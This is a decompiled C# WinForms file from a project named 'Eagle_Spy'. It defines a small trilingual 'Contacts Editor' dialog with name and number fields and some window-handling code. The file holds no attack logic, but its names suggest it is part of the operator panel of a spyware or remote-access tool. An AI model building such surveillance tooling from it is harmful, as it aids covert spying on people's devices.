using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using DrakeUI.Framework;
using Guna.UI2.WinForms;
using Microsoft.VisualBasic.CompilerServices;

namespace Eagle_Spy
{
	// Token: 0x02000012 RID: 18
	[DesignerGenerated]
	public partial class AddNumber : Form
	{
		// Token: 0x060001AB RID: 427 RVA: 0x00002423 File Offset: 0x00000623
		private void b_ok_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x060001AC RID: 428 RVA: 0x00002425 File Offset: 0x00000625
		public AddNumber()
		{
			base.Load += this.AddNumber_Load;
			this.RectInputText0 = new List<Rectangle>();
			this.InitializeComponent();
			this.Font = reso.f;
		}

		// Token: 0x060001AD RID: 429 RVA: 0x0000245B File Offset: 0x0000065B
		private void TOpacity_Tick(object sender, EventArgs e)
		{
			if (base.Opacity != 1.0)
			{
				base.Opacity += 0.1;
				return;
			}
			this.TOpacity.Enabled = false;
		}

		// Token: 0x060001AE RID: 430 RVA: 0x00002491 File Offset: 0x00000691
		private void AddNumber_Load(object sender, EventArgs e)
		{
			this.UpdateLanguage();
			base.Icon = new Icon(reso.res_Path + "\\Icons\\win\\12.ico");
			this.TOpacity.Interval = SpySettings.T_Interval;
			this.TOpacity.Enabled = true;
		}

		// Token: 0x060001AF RID: 431 RVA: 0x0000CF8C File Offset: 0x0000B18C
		private void UpdateEnglish()
		{
			this.label1.Text = "Contacts Editor";
			this.L0.Text = "Name";
			this.L1.Text = "Number";
			this.drakeUIButtonIcon2.Text = "Add to Contacts";
		}

		// Token: 0x060001B0 RID: 432 RVA: 0x0000CFDC File Offset: 0x0000B1DC
		private void UpdateChinese()
		{
			this.label1.Text = "联系人编辑器";
			this.L0.Text = "姓名";
			this.L1.Text = "号码";
			this.drakeUIButtonIcon2.Text = "添加到联系人";
		}

		// Token: 0x060001B1 RID: 433 RVA: 0x0000D02C File Offset: 0x0000B22C
		private void UpdateRussian()
		{
			this.label1.Text = "Редактор контактов";
			this.L0.Text = "Имя";
			this.L1.Text = "Номер";
			this.drakeUIButtonIcon2.Text = "Добавить в контакты";
		}

		// Token: 0x060001B2 RID: 434 RVA: 0x0000D07C File Offset: 0x0000B27C
		private void UpdateLanguage()
		{
			string text = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "res", "Config", "Language.inf");
			if (File.Exists(text))
			{
				string text2 = File.ReadAllText(text);
				if (text2.Contains("English"))
				{
					this.UpdateEnglish();
					return;
				}
				if (text2.Contains("Russian"))
				{
					this.UpdateRussian();
					return;
				}
				if (text2.Contains("Chinese"))
				{
					this.UpdateChinese();
					return;
				}
				this.UpdateEnglish();
			}
		}

		// Token: 0x060001B3 RID: 435 RVA: 0x000024CF File Offset: 0x000006CF
		private void DrakeUIButtonIcon3_Click(object sender, EventArgs e)
		{
			base.DialogResult = DialogResult.OK;
		}

		// Token: 0x060001B4 RID: 436 RVA: 0x00002423 File Offset: 0x00000623
		private void sButton1_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x060001B5 RID: 437 RVA: 0x000024CF File Offset: 0x000006CF
		private void drakeUIButtonIcon2_Click(object sender, EventArgs e)
		{
			base.DialogResult = DialogResult.OK;
		}

		// Token: 0x060001B6 RID: 438
		[DllImport("user32.dll")]
		public static extern int SendMessage(IntPtr hWnd, int Msg, int wParam, int lParam);

		// Token: 0x060001B7 RID: 439
		[DllImport("user32.dll")]
		public static extern bool ReleaseCapture();

		// Token: 0x060001B8 RID: 440 RVA: 0x000024D8 File Offset: 0x000006D8
		private void guna2Panel2_MouseDown(object sender, MouseEventArgs e)
		{
			if (e.Button == MouseButtons.Left)
			{
				AddNumber.ReleaseCapture();
				AddNumber.SendMessage(base.Handle, 161, 2, 0);
			}
		}

		// Token: 0x0400003A RID: 58
		private DrakeUIButtonIcon _DrakeUIButtonIcon3;

		// Token: 0x0400003B RID: 59
		private List<Rectangle> RectInputText0;
	}
}
